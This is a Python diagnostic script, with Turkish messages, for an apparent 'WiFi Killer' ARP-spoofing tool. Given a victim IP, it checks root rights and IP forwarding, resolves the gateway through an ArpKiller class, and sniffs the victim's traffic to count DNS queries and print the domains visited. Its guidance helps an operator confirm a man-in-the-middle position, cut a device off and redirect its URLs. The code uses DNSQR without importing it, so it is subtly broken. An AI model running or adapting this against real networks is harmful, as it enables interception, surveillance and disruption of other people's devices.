import os
import subprocess
import sys

sys.stdout.reconfigure(encoding="utf-8")

from scapy.all import DNS, sniff

from redirector import get_forwarding_enabled
from spoofer import ArpKiller, is_admin, get_ping_flags


def main():
    if len(sys.argv) < 2:
        print("Kullanim: python diagnose.py <hedef_ip>")
        sys.exit(1)
    victim = sys.argv[1]

    print("=== WiFi Killer Teshis ===\n")
    print(f"[1] Yonetici/root yetkisi   : {'VAR' if is_admin() else 'YOK <- programi root (su) ile baslat!'}")
    print(f"[2] IP forwarding           : {'Acik' if get_forwarding_enabled() else 'Kapali'}")

    killer = ArpKiller(victim, "00:00:00:00:00:01")
    print(f"[3] Gateway               : {killer.gateway_ip} ({killer.gateway_mac or 'cozulemedi'})")
    print(f"    Benim MAC             : {killer.my_mac}")

    ping = subprocess.run(get_ping_flags(victim, count=1, timeout_ms=1000), capture_output=True)
    print(f"[4] Hedefe LAN erisimi    : {'VAR' if ping.returncode == 0 else 'YOK'}")

    iface = killer.iface
    stats = {"total": 0, "dns": 0}
    samples = []

    def cb(pkt):
        stats["total"] += 1
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            stats["dns"] += 1
            if len(samples) < 5:
                samples.append(pkt[DNSQR].qname.decode(errors="ignore").rstrip("."))

    print(f"\n[5] 10 sn boyunca {victim} dinleniyor... telefonda bir site acmayi dene!\n")
    try:
        sniff(
            iface=iface,
            filter=f"ether dst {killer.my_mac} and src host {victim}",
            prn=cb,
            store=False,
            timeout=10,
        )
    except Exception as exc:
        print(f"Dinleme hatasi: {exc}")

    print(f"Gelen paket (bizim MAC'e) : {stats['total']}")
    print(f"Saf DNS sorgusu (udp/53)  : {stats['dns']}")
    if samples:
        print(f"Ornek domainler           : {', '.join(samples)}")

    print("\n--- Yorum ---")
    if stats["total"] == 0:
        print("Hic trafik bizden gecmiyor -> ARP spoofing aktif DEGIL.")
        print("Once secenek 2 ile cihazi kesin, sonra tekrar test edin.")
    elif stats["dns"] == 0:
        print("Trafik bizden gecior AMA saf DNS sorgusu YOK.")
        print("Telefonda Ozel DNS / DoH acik olabilir (Android: Ag > Ozel DNS = Kapat).")
        print("Bu durumda URL yonlendirme yapilamaz, sadece kesinti modu calisir.")
    else:
        print("Her seyi dogru gorunuyor: trafik ve DNS bize ulasiyor.")
        print("URL modunda sorun yok demektir.")


if __name__ == "__main__":
    main()
